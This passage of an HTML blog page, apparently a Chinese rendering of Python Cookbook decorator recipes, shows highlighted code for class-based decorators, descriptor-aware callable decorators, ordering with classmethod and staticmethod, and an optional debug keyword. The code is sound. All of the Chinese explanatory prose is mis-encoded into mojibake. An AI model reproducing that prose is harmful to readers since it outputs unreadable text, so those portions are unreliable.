class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="comment"># Decorator as an instance method</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator1</span><span class="params">(self, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            print(<span class="string">'Decorator 1'</span>)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Decorator as a class method</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator2</span><span class="params">(cls, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            print(<span class="string">'Decorator 2'</span>)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½œä¸ºå®ä¾‹æ–¹æ³•</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="meta">@a.decorator1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># ä½œä¸ºç±»æ–¹æ³•</span></span><br><span class="line"><span class="meta">@A.decorator2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grok</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>åœ¨ç±»ä¸­å®šä¹‰è£…é¥°å™¨åˆçœ‹ä¸Šå»å¥½åƒå¾ˆå¥‡æ€ªï¼Œä½†æ˜¯åœ¨æ ‡å‡†åº“ä¸­æœ‰å¾ˆå¤šè¿™æ ·çš„ä¾‹å­ã€‚ ç‰¹åˆ«çš„ï¼Œ<code>@property</code>è£…é¥°å™¨å®é™…ä¸Šæ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒé‡Œé¢å®šä¹‰äº†ä¸‰ä¸ªæ–¹æ³•<code>getter()</code>,<code>setter()</code>,<code>deleter()</code>, æ¯ä¸€ä¸ªæ–¹æ³•éƒ½æ˜¯ä¸€ä¸ªè£…é¥°å™¨ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="comment"># Create a property instance</span></span><br><span class="line">    first_name = property()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @first_name.getter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._first_name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @first_name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">        self._first_name = value</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå®šä¹‰çš„ä¸»è¦åŸå› æ˜¯å„ç§ä¸åŒçš„è£…é¥°å™¨æ–¹æ³•ä¼šåœ¨å…³è”çš„<code>property</code>å®ä¾‹ä¸Šæ“ä½œå®ƒçš„çŠ¶æ€ã€‚ å› æ­¤ï¼Œä»»ä½•æ—¶å€™åªè¦ä½ ç¢°åˆ°éœ€è¦åœ¨è£…é¥°å™¨ä¸­è®°å½•æˆ–ç»‘å®šä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™ä¸å¤±ä¸ºä¸€ç§å¯è¡Œæ–¹æ³•ã€‚</p><p>åœ¨ç±»ä¸­å®šä¹‰è£…é¥°å™¨æœ‰ä¸ªéš¾ç†è§£çš„åœ°æ–¹å°±æ˜¯å¯¹äºé¢å¤–å‚æ•°<code>self</code>æˆ–<code>cls</code>çš„æ­£ç¡®ä½¿ç”¨ã€‚å°½ç®¡æœ€å¤–å±‚çš„è£…é¥°å™¨å‡½æ•°æ¯”å¦‚<code>decorator1()</code>æˆ–<code>decorator2()</code>éœ€è¦æä¾›ä¸€ä¸ª<code>self</code>æˆ–<code>cls</code>å‚æ•°ï¼Œä½†æ˜¯åœ¨ä¸¤ä¸ªè£…é¥°å™¨å†…éƒ¨è¢«åˆ›å»ºçš„<code>wrapper()</code>å‡½æ•°å¹¶ä¸éœ€è¦åŒ…å«è¿™ä¸ª<code>self</code>å‚æ•°ã€‚ä½ å”¯ä¸€éœ€è¦è¿™ä¸ªå‚æ•°æ˜¯åœ¨ä½ ç¡®å®è¦è®¿é—®åŒ…è£…å™¨ä¸­è¿™ä¸ªå®ä¾‹çš„æŸäº›éƒ¨åˆ†çš„æ—¶å€™ã€‚å…¶ä»–æƒ…å†µä¸‹éƒ½ä¸ç”¨å»ç®¡å®ƒã€‚</p><p>å¯¹äºç±»é‡Œé¢å®šä¹‰çš„åŒ…è£…å™¨è¿˜æœ‰ä¸€ç‚¹æ¯”è¾ƒéš¾ç†è§£ï¼Œå°±æ˜¯åœ¨æ¶‰åŠåˆ°ç»§æ‰¿çš„æ—¶å€™ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³è®©åœ¨<code>A</code>ä¸­å®šä¹‰çš„è£…é¥°å™¨ä½œç”¨åœ¨å­ç±»<code>B</code>ä¸­ã€‚ä½ éœ€è¦åƒä¸‹é¢è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line"><span class="meta">    @A.decorator2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè£…é¥°å™¨è¦è¢«å®šä¹‰æˆç±»æ–¹æ³•å¹¶ä¸”ä½ å¿…é¡»æ˜¾å¼çš„ä½¿ç”¨çˆ¶ç±»åå»è°ƒç”¨å®ƒã€‚ä¸èƒ½ä½¿ç”¨<code>@B.decorator2</code>ï¼Œå› ä¸ºåœ¨æ–¹æ³•å®šä¹‰æ—¶ï¼Œè¿™ä¸ªç±»<code>B</code>è¿˜æ²¡æœ‰è¢«åˆ›å»ºã€‚</p><h4 id="å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»"><a href="#å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»" class="headerlink" title="å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»"></a>å°†è£…é¥°å™¨å®šä¹‰ä¸ºç±»</h4><p>å¦‚æœæƒ³ä½¿ç”¨ä¸€ä¸ªè£…é¥°å™¨å»åŒ…è£…å‡½æ•°ï¼Œä½†æ˜¯å¸Œæœ›è¿”å›ä¸€ä¸ªå¯è°ƒç”¨çš„å®ä¾‹ã€‚éœ€è¦è®©ä½ çš„è£…é¥°å™¨å¯ä»¥åŒæ—¶å·¥ä½œåœ¨ç±»å®šä¹‰çš„å†…éƒ¨å’Œå¤–éƒ¨ã€‚<br>ä¸ºäº†å°†è£…é¥°å™¨å®šä¹‰æˆä¸€ä¸ªå®ä¾‹ï¼Œéœ€è¦ç¡®ä¿å®ƒå®ç°äº†<code>__call__()</code>å’Œ<code>__get__()</code>æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„ä»£ç å®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œå®ƒåœ¨å…¶ä»–å‡½æ•°ä¸Šæ”¾ç½®ä¸€ä¸ªç®€å•çš„è®°å½•å±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profiled</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></span><br><span class="line">        wraps(func)(self)</span><br><span class="line">        self.ncalls = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        self.ncalls += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.__wrapped__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, instance, cls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> types.MethodType(self, instance)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å°†å®ƒå½“åšä¸€ä¸ªæ™®é€šçš„è£…é¥°å™¨æ¥ä½¿ç”¨ï¼Œåœ¨ç±»é‡Œé¢æˆ–å¤–é¢éƒ½å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Profiled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line"><span class="meta">    @Profiled</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(self, x)</span><br></pre></td></tr></table></figure><p>åœ¨äº¤äº’ç¯å¢ƒä¸­çš„ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.ncalls</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.bar(<span class="number">1</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x10069e9d0</span>&gt; <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.bar(<span class="number">2</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x10069e9d0</span>&gt; <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.bar(<span class="number">3</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x10069e9d0</span>&gt; <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.bar.ncalls</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="ä¸ºç±»å’Œé™æ€æ–¹æ³•æä¾›è£…é¥°å™¨"><a href="#ä¸ºç±»å’Œé™æ€æ–¹æ³•æä¾›è£…é¥°å™¨" class="headerlink" title="ä¸ºç±»å’Œé™æ€æ–¹æ³•æä¾›è£…é¥°å™¨"></a>ä¸ºç±»å’Œé™æ€æ–¹æ³•æä¾›è£…é¥°å™¨</h4><p>ç»™ç±»æˆ–é™æ€æ–¹æ³•æä¾›è£…é¥°å™¨çš„å‰ææ˜¯è¦ç¡®ä¿è£…é¥°å™¨åœ¨<code>@classmethod</code>æˆ–<code>@staticmethod</code>ä¹‹å‰ã€‚ä¾‹å¦‚:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="comment"># A simple decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end-start)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">instance_method</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        print(self, n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">class_method</span><span class="params">(cls, n)</span>:</span></span><br><span class="line">        print(cls, n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">static_method</span><span class="params">(n)</span>:</span></span><br><span class="line">        print(n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è£…é¥°åçš„ç±»å’Œé™æ€æ–¹æ³•å¯æ­£å¸¸å·¥ä½œï¼Œåªä¸è¿‡å¢åŠ äº†é¢å¤–çš„è®¡æ—¶åŠŸèƒ½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.instance_method(<span class="number">1000000</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x1006a6050</span>&gt; <span class="number">1000000</span></span><br><span class="line"><span class="number">0.11817407608032227</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.class_method(<span class="number">1000000</span>)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Spam</span>'&gt; 1000000</span></span><br><span class="line"><span class="class">0.11334395408630371</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Spam</span>.<span class="title">static_method</span><span class="params">(<span class="number">1000000</span>)</span></span></span><br><span class="line"><span class="class">1000000</span></span><br><span class="line"><span class="class">0.11740279197692871</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä½ æŠŠè£…é¥°å™¨çš„é¡ºåºå†™é”™äº†å°±ä¼šå‡ºé”™ã€‚ä¾‹å¦‚ä¸‹é¢è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">static_method</span><span class="params">(n)</span>:</span></span><br><span class="line">        print(n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨è¿™ä¸ªé™æ€æ–¹æ³•å°±ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.static_method(<span class="number">1000000</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">"timethis.py"</span>, line <span class="number">6</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">start = time.time()</span><br><span class="line">TypeError: <span class="string">'staticmethod'</span> object <span class="keyword">is</span> <span class="keyword">not</span> callable</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>é—®é¢˜åœ¨äº<code>@classmethod</code>å’Œ<code>@staticmethod</code>å®é™…ä¸Šå¹¶ä¸ä¼šåˆ›å»ºå¯ç›´æ¥è°ƒç”¨çš„å¯¹è±¡ï¼Œè€Œæ˜¯åˆ›å»ºç‰¹æ®Šçš„æè¿°å™¨å¯¹è±¡ã€‚å› æ­¤å½“ä½ è¯•ç€åœ¨å…¶ä»–è£…é¥°å™¨ä¸­å°†å®ƒä»¬å½“åšå‡½æ•°æ¥ä½¿ç”¨æ—¶å°±ä¼šå‡ºé”™ã€‚ç¡®ä¿è¿™ç§è£…é¥°å™¨å‡ºç°åœ¨è£…é¥°å™¨é“¾ä¸­çš„ç¬¬ä¸€ä¸ªä½ç½®å¯ä»¥ä¿®å¤è¿™ä¸ªé—®é¢˜ã€‚<br>å½“æˆ‘ä»¬åœ¨æŠ½è±¡åŸºç±»ä¸­å®šä¹‰ç±»æ–¹æ³•å’Œé™æ€æ–¹æ³•æ—¶ï¼Œä¾‹å¦‚æƒ³å®šä¹‰ä¸€ä¸ªæŠ½è±¡ç±»æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ<code>@classmethod</code>è·Ÿ<code>@abstractmethod</code>ä¸¤è€…çš„é¡ºåºæ˜¯æœ‰è®²ç©¶çš„ï¼Œå¦‚æœè°ƒæ¢å®ƒä»¬çš„é¡ºåºå°±ä¼šå‡ºé”™ã€‚</p><h4 id="è£…é¥°å™¨ä¸ºè¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•°"><a href="#è£…é¥°å™¨ä¸ºè¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•°" class="headerlink" title="è£…é¥°å™¨ä¸ºè¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•°"></a>è£…é¥°å™¨ä¸ºè¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•°</h4><p>å¦‚æœæƒ³åœ¨è£…é¥°å™¨ä¸­ç»™è¢«åŒ…è£…å‡½æ•°å¢åŠ é¢å¤–çš„å‚æ•°ï¼Œä½†æ˜¯ä¸èƒ½å½±å“è¿™ä¸ªå‡½æ•°ç°æœ‰çš„è°ƒç”¨è§„åˆ™ã€‚å¯ä»¥ä½¿ç”¨å…³é”®å­—å‚æ•°æ¥ç»™åŒ…è£…å‡½æ•°å¢åŠ é¢å¤–å‚æ•°ï¼Œè€ƒè™‘å¦‚ä¸‹è£…é¥°å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">optional_debug</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, debug=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">'Calling'</span>, func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@optional_debug</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line"><span class="meta">... </span>    print(a,b,c)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, debug=<span class="literal">True</span>)</span><br><span class="line">Calling spam</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è£…é¥°å™¨æ¥ç»™è¢«åŒ…è£…å‡½æ•°å¢åŠ å‚æ•°çš„åšæ³•å¹¶ä¸å¸¸è§ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæœ‰æ—¶å€™å®ƒå¯ä»¥é¿å…ä¸€äº›é‡å¤ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæœ‰ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x, debug=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">'Calling a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(x, y, z, debug=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">'Calling b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(x, y, debug=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">'Calling c'</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å°†å…¶é‡æ„ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">optional_debug</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'debug'</span> <span class="keyword">in</span> inspect.getfullargspec(func).args:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'debug argument already defined'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, debug=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">'Calling'</span>, func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@optional_debug</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@optional_debug</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@optional_debug</span></span><br><span class="line"><span class="function"><span 